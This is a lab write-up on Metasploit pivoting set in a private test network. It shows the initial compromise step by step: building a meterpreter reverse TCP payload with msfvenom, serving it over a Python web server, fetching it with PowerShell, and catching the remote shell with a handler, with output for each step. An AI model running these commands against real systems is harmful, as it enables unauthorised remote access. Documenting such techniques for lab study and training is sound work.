# Pivoting in Metasploit

## Test Environment 

- **Attacker**: Kali Linux 2025.2 (10.0.2.13)
- **Pivot**: Windows 10 Enterprise (172.16.0.101, 10.0.2.14)
- **Target**: Windows Server 2025 (172.16.0.1)

## Autoroute

Using the module ```post/multi/manage/autoroute```, we are able to add routes for the target to Metasploit’s routing table, enabling pivoting to private networks accessible by the compromised host.

## Compromising the target

For simplicity, we disabled Microsoft Defender on the Windows 10 VM and used msfvenom to compile a Windows meterpreter staged reverse tcp payload.

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.13 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
We can then start a python server on the attacker machine and download the payload on the target using PowerShell.

```bash
PS C:\Users\j-doe\Desktop> Invoke-WebRequest http://10.0.2.13:8080/shell.exe -OutFile shell.exe
```
```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.2.14 - - [02/Nov/2025 14:12:48] "GET /shell.exe HTTP/1.1" 200 -
10.0.2.14 - - [02/Nov/2025 14:14:50] "GET /shell.exe HTTP/1.1" 200 -
```
We had already set up a Metasploit listener and the target establishes a connection once shell.exe is executed.

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.0.2.13; set lport 4444; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.0.2.13
lport => 4444
[*] Started reverse TCP handler on 10.0.2.13:4444 
[*] Sending stage (203846 bytes) to 10.0.2.14
[*] Meterpreter session 1 opened (10.0.2.13:4444 -> 10.0.2.14:57712) at 2025-11-02 14:22:58 -0500

meterpreter > sysinfo
Computer        : WIN10
OS              : Windows 10 22H2+ (10.0 Build 19045).
Architecture    : x64
System Language : en_GB
Domain          : LAB
Logged On Users : 7
Meterpreter     : x64/windows
```
